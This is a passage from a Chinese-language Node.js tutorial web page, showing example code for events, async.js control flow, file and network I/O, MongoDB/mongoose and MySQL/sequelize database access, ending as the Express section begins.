class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Event has occurred!&#x27;</span>);<br>&#125;);<br><br>emitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;event&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h4 id="3-2-2-自定义事件处理"><a href="#3-2-2-自定义事件处理" class="headerlink" title="3.2.2 自定义事件处理"></a>3.2.2 自定义事件处理</h4><p>你可以自定义事件，事件可以传递参数供监听器处理。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">emitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;greet&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">name</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;name&#125;</span>!`</span>);<br>&#125;);<br><br>emitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;greet&#x27;</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h3 id="3-3-异步控制流管理"><a href="#3-3-异步控制流管理" class="headerlink" title="3.3 异步控制流管理"></a>3.3 异步控制流管理</h3><h4 id="3-3-1-async-js-库的使用"><a href="#3-3-1-async-js-库的使用" class="headerlink" title="3.3.1 async.js 库的使用"></a>3.3.1 <code>async.js</code> 库的使用</h4><p><code>async.js</code> 是一个控制异步流程的库，提供了多种控制异步任务的方式，如并行、串行等。</p>
<p><strong>并行执行异步任务：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-keyword">async</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;async&#x27;</span>);<br><br><span class="hljs-keyword">async</span>.<span class="hljs-title function_">parallel</span>([<br>  <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Task 1&#x27;</span>);<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">1</span>);<br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;,<br>  <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Task 2&#x27;</span>);<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);<br>    &#125;, <span class="hljs-number">500</span>);<br>  &#125;<br>], <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);  <span class="hljs-comment">// 输出: [1, 2]</span><br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="3-3-2-异步队列与并发控制"><a href="#3-3-2-异步队列与并发控制" class="headerlink" title="3.3.2 异步队列与并发控制"></a>3.3.2 异步队列与并发控制</h4><p><code>async.queue</code> 提供了一种控制并发执行任务的方式。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-keyword">async</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;async&#x27;</span>);<br><br><span class="hljs-keyword">const</span> q = <span class="hljs-keyword">async</span>.<span class="hljs-title function_">queue</span>(<span class="hljs-function">(<span class="hljs-params">task, callback</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Processing task <span class="hljs-subst">$&#123;task.name&#125;</span>`</span>);<br>  <span class="hljs-title function_">callback</span>();<br>&#125;, <span class="hljs-number">2</span>);  <span class="hljs-comment">// 最大并发数为 2</span><br><br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 1&#x27;</span>&#125;);<br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 2&#x27;</span>&#125;);<br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 3&#x27;</span>&#125;);<br></code></pre></td></tr></table></figure>



<hr>
<h2 id="4-文件操作与-I-O-1"><a href="#4-文件操作与-I-O-1" class="headerlink" title="4. 文件操作与 I&#x2F;O"></a>4. 文件操作与 I&#x2F;O</h2><h3 id="4-1-文件系统操作"><a href="#4-1-文件系统操作" class="headerlink" title="4.1 文件系统操作"></a>4.1 文件系统操作</h3><p>Node.js 的 <code>fs</code> 模块用于与文件系统交互，可以读取、写入文件以及管理目录。它支持同步和异步操作。</p>
<h4 id="4-1-1-读取与写入文件"><a href="#4-1-1-读取与写入文件" class="headerlink" title="4.1.1 读取与写入文件"></a>4.1.1 读取与写入文件</h4><p><strong>异步读取文件：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p><strong>同步读取文件：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br></code></pre></td></tr></table></figure>

<p><strong>写入文件：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> content = <span class="hljs-string">&#x27;This is a new content.&#x27;</span>;<br>fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, content, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;File written successfully.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="4-1-2-文件流与大文件处理"><a href="#4-1-2-文件流与大文件处理" class="headerlink" title="4.1.2 文件流与大文件处理"></a>4.1.2 文件流与大文件处理</h4><p>对于大文件，使用流处理更高效，因为流分块读取文件，而不是将整个文件读入内存。</p>
<p><strong>读取文件流：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">const</span> readStream = fs.<span class="hljs-title function_">createReadStream</span>(<span class="hljs-string">&#x27;largeFile.txt&#x27;</span>, &#123; <span class="hljs-attr">encoding</span>: <span class="hljs-string">&#x27;utf8&#x27;</span> &#125;);<br>readStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">chunk</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Received chunk: <span class="hljs-subst">$&#123;chunk&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p><strong>写入文件流：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> writeStream = fs.<span class="hljs-title function_">createWriteStream</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>);<br><br>writeStream.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;First chunk of data\n&#x27;</span>);<br>writeStream.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;Second chunk of data\n&#x27;</span>);<br>writeStream.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;End of writing process.&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h3 id="4-2-网络-I-O-操作"><a href="#4-2-网络-I-O-操作" class="headerlink" title="4.2 网络 I&#x2F;O 操作"></a>4.2 网络 I&#x2F;O 操作</h3><p>Node.js 提供了丰富的网络操作模块，特别适合处理高并发的网络应用。</p>
<h4 id="4-2-1-创建-HTTP-服务器"><a href="#4-2-1-创建-HTTP-服务器" class="headerlink" title="4.2.1 创建 HTTP 服务器"></a>4.2.1 创建 HTTP 服务器</h4><p>Node.js 的 <code>http</code> 模块可以用于创建 HTTP 服务器，处理客户端请求和响应。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span> &#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, World!\n&#x27;</span>);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server is running at http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="4-2-2-处理请求与响应"><a href="#4-2-2-处理请求与响应" class="headerlink" title="4.2.2 处理请求与响应"></a>4.2.2 处理请求与响应</h4><p>在处理客户端请求时，Node.js 提供了 <code>req</code> 对象（表示请求）和 <code>res</code> 对象（表示响应）。</p>
<p><strong>获取请求的 URL 和方法：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Requested URL: <span class="hljs-subst">$&#123;req.url&#125;</span>`</span>);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request method: <span class="hljs-subst">$&#123;req.method&#125;</span>`</span>);<br><br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> &#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Hello, Node.js!&lt;/h1&gt;&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="4-2-3-使用-https-模块进行安全通信"><a href="#4-2-3-使用-https-模块进行安全通信" class="headerlink" title="4.2.3 使用 https 模块进行安全通信"></a>4.2.3 使用 <code>https</code> 模块进行安全通信</h4><p>使用 <code>https</code> 模块可以创建安全的 HTTPS 服务器。你需要提供 SSL 证书和私钥。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> https = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;https&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">const</span> options = &#123;<br>  <span class="hljs-attr">key</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private-key.pem&#x27;</span>),<br>  <span class="hljs-attr">cert</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;certificate.pem&#x27;</span>)<br>&#125;;<br><br>https.<span class="hljs-title function_">createServer</span>(options, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, HTTPS world!&#x27;</span>);<br>&#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">443</span>);<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="5-数据库与存储-1"><a href="#5-数据库与存储-1" class="headerlink" title="5. 数据库与存储"></a>5. 数据库与存储</h2><p>Node.js 支持多种数据库，包括 NoSQL（如 MongoDB）和关系型数据库（如 MySQL）。</p>
<h3 id="5-1-使用-MongoDB"><a href="#5-1-使用-MongoDB" class="headerlink" title="5.1 使用 MongoDB"></a>5.1 使用 MongoDB</h3><p>MongoDB 是一种 NoSQL 数据库，适用于存储 JSON 风格的文档数据。使用 <code>mongoose</code> 库，可以轻松连接和操作 MongoDB 数据库。</p>
<h4 id="5-1-1-连接到-MongoDB"><a href="#5-1-1-连接到-MongoDB" class="headerlink" title="5.1.1 连接到 MongoDB"></a>5.1.1 连接到 MongoDB</h4><p>安装 <code>mongoose</code> 并连接到 MongoDB 数据库：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install mongoose<br></code></pre></td></tr></table></figure>

<p><strong>连接到 MongoDB：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> mongoose = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongoose&#x27;</span>);<br><br>mongoose.<span class="hljs-title function_">connect</span>(<span class="hljs-string">&#x27;mongodb://localhost:27017/mydb&#x27;</span>, &#123; <span class="hljs-attr">useNewUrlParser</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">useUnifiedTopology</span>: <span class="hljs-literal">true</span> &#125;);<br><br><span class="hljs-keyword">const</span> db = mongoose.<span class="hljs-property">connection</span>;<br>db.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">console</span>, <span class="hljs-string">&#x27;Connection error:&#x27;</span>));<br>db.<span class="hljs-title function_">once</span>(<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MongoDB.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="5-1-2-CRUD-操作"><a href="#5-1-2-CRUD-操作" class="headerlink" title="5.1.2 CRUD 操作"></a>5.1.2 CRUD 操作</h4><p><strong>定义数据模型：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = mongoose.<span class="hljs-title function_">model</span>(<span class="hljs-string">&#x27;User&#x27;</span>, &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-title class_">Number</span><br>&#125;);<br></code></pre></td></tr></table></figure>

<p><strong>创建新文档：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;);<br>user.<span class="hljs-title function_">save</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;User saved.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p><strong>查询数据：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">User</span>.<span class="hljs-title function_">find</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;, <span class="hljs-function">(<span class="hljs-params">err, users</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(users);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="5-1-3-使用-Mongoose-进行数据建模"><a href="#5-1-3-使用-Mongoose-进行数据建模" class="headerlink" title="5.1.3 使用 Mongoose 进行数据建模"></a>5.1.3 使用 Mongoose 进行数据建模</h4><p><code>Mongoose</code> 提供了 Schema 定义功能，帮助我们对 MongoDB 数据进行建模。</p>
<p><strong>定义 Schema：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> userSchema = <span class="hljs-keyword">new</span> mongoose.<span class="hljs-title class_">Schema</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-title class_">Number</span>,<br>  <span class="hljs-attr">email</span>: &#123; <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> &#125;<br>&#125;);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = mongoose.<span class="hljs-title function_">model</span>(<span class="hljs-string">&#x27;User&#x27;</span>, userSchema);<br></code></pre></td></tr></table></figure>

<h3 id="5-2-使用-MySQL"><a href="#5-2-使用-MySQL" class="headerlink" title="5.2 使用 MySQL"></a>5.2 使用 MySQL</h3><p>MySQL 是一种关系型数据库，Node.js 提供了多种库来连接 MySQL 数据库，如 <code>mysql</code>、<code>sequelize</code> 等。</p>
<h4 id="5-2-1-连接到-MySQL"><a href="#5-2-1-连接到-MySQL" class="headerlink" title="5.2.1 连接到 MySQL"></a>5.2.1 连接到 MySQL</h4><p>安装 <code>mysql</code> 库：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install mysql<br></code></pre></td></tr></table></figure>

<p><strong>连接到 MySQL：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br><br><span class="hljs-keyword">const</span> connection = mysql.<span class="hljs-title function_">createConnection</span>(&#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;password&#x27;</span>,<br>  <span class="hljs-attr">database</span>: <span class="hljs-string">&#x27;mydb&#x27;</span><br>&#125;);<br><br>connection.<span class="hljs-title function_">connect</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MySQL.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="5-2-2-执行-SQL-查询"><a href="#5-2-2-执行-SQL-查询" class="headerlink" title="5.2.2 执行 SQL 查询"></a>5.2.2 执行 SQL 查询</h4><p><strong>执行 SELECT 查询：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p><strong>执行 INSERT 查询：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> user = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> &#125;;<br>connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;INSERT INTO users SET ?&#x27;</span>, user, <span class="hljs-function">(<span class="hljs-params">err, result</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;User added.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="5-2-3-使用-sequelize-进行-ORM-映射"><a href="#5-2-3-使用-sequelize-进行-ORM-映射" class="headerlink" title="5.2.3 使用 sequelize 进行 ORM 映射"></a>5.2.3 使用 <code>sequelize</code> 进行 ORM 映射</h4><p><code>sequelize</code> 是 Node.js 中常用的 ORM 工具，支持 MySQL、PostgreSQL、SQLite 等数据库。</p>
<p>安装 <code>sequelize</code> 和 MySQL 驱动：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install sequelize mysql2<br></code></pre></td></tr></table></figure>

<p><strong>定义模型并同步数据库：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">Sequelize</span>, <span class="hljs-title class_">DataTypes</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sequelize&#x27;</span>);<br><span class="hljs-keyword">const</span> sequelize = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sequelize</span>(<span class="hljs-string">&#x27;mydb&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>, &#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">dialect</span>: <span class="hljs-string">&#x27;mysql&#x27;</span><br>&#125;);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = sequelize.<span class="hljs-title function_">define</span>(<span class="hljs-string">&#x27;User&#x27;</span>, &#123;<br>  <span class="hljs-attr">name</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-title class_">DataTypes</span>.<span class="hljs-property">STRING</span>,<br>    <span class="hljs-attr">allowNull</span>: <span class="hljs-literal">false</span><br>  &#125;,<br>  <span class="hljs-attr">age</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-title class_">DataTypes</span>.<span class="hljs-property">INTEGER</span>,<br>    <span class="hljs-attr">allowNull</span>: <span class="hljs-literal">false</span><br>  &#125;<br>&#125;);<br><br>sequelize.<span class="hljs-title function_">sync</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Database synced.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="6-Web-开发与框架-1"><a href="#6-Web-开发与框架-1" class="headerlink" title="6. Web 开发与框架"></a>6. Web 开发与框架</h2><p>Node.js 是开发 Web 应用的热门选择，常用的 Web 框架包括 <strong>Express</strong> 和 <strong>Koa</strong>。</p>
<h3 id="6-1-使用-Express-框架"><a href="#6-1-使用-Express-框架" class="headerlink" title="6.1 使用 Express 框架"></a>6.1 使用 Express 框架</h3><p><code>Express</code> 是最流行的 Node.js Web 框架，简化了路由处理、请求处理和中间件管理。</p>
<h4 id="6-1-1-创建基本的-Express-应用"><a href="#6-1-1-创建基本的-Express-应用" class="headerlink" title="6.1.1 创建基本的 Express 应用"></a>6.1.1 创建基本的 Express 应用</h4><p>安装 <code>Express</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install express<br></code></pre></td></tr></table></figure>

<p><strong>创建简单的 Express 应用：</strong></p>
